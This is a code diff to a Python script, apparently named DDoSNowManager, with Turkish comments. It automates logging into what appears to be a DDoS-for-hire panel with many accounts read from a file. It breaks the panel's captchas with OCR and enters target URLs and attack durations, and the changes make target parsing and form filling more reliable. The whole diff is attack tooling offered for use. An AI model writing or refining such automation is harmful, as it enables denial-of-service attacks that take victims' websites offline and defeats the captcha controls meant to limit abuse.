@@ -8,10 +8,9 @@ import shutil
 import sys
 import logging
 from datetime import datetime
-from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout, expect
+from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
 from PIL import Image
 import ddddocr
-import traceback
 
 # Log
 LOG_DIR = "logs"
@@ -53,10 +52,18 @@ class DDoSNowManager:
             for line in f:
                 line = line.strip()
                 if line and not line.startswith("#"):
-                    p = line.split(":")
-                    if len(p) >= 3:
-                        accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
+                    # 🔥 DÜZELTME 1: Sadece ilk 2 ':' karakterinde böl, URL'deki ':'leri koru!
+                    p = line.split(":", 2)
+                    if len(p) == 3:
+                        accounts.append({
+                            "id": str(len(accounts)+1), 
+                            "user": p[0], 
+                            "pass": p[1], 
+                            "target": p[2]
+                        })
                         logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
+                    else:
+                        logger.warning(f"Geçersiz satır atlandı: {line}")
         return accounts
 
     def solve_captcha(self, page, username):
@@ -64,7 +71,6 @@ class DDoSNowManager:
         while True:
             attempt += 1
             try:
-                # Captcha görselini bekle
                 img_elem = page.locator("img[alt='captcha']").first
                 if img_elem.count() == 0:
                     time.sleep(1)
@@ -208,21 +214,22 @@ class DDoSNowManager:
                                 page.reload()
                                 time.sleep(3)
                                 continue
+                            
+                            # 🔥 DÜZELTME 2: Önce temizle, sonra doğru URL'yi gir
+                            target_input.fill("")
+                            time.sleep(0.5)
                             target_input.fill(target_url)
                             logger.info(f"[{username}] Hedef URL: {target_url}")
                             
-                            # 2. Süre inputunun açılmasını bekle (max 10 saniye)
-                            time_input = None
-                            for _ in range(10):
-                                time_input = page.locator("input[name='hub.0.time']").first
-                                if time_input.count() > 0:
-                                    break
-                                time.sleep(1)
-                            
-                            if time_input is None or time_input.count() == 0:
-                                logger.error(f"[{username}] Süre input bulunamadı!")
+                            # 2. Süre inputunun açılmasını bekle (max 15 saniye)
+                            # 🔥 DÜZELTME 3: wait_for_selector kullan, döngü değil
+                            try:
+                                time_input = page.wait_for_selector("input[name='hub.0.time']", timeout=15000)
+                                logger.info(f"[{username}] Süre inputu aktif!")
+                            except PlaywrightTimeout:
+                                logger.error(f"[{username}] Süre input 15 saniyede açılmadı! Muhtemelen URL geçersiz.")
                                 page.reload()
-                                time.sleep(3)
+                                time.sleep(5)
                                 continue
                             
                             time_input.fill("")
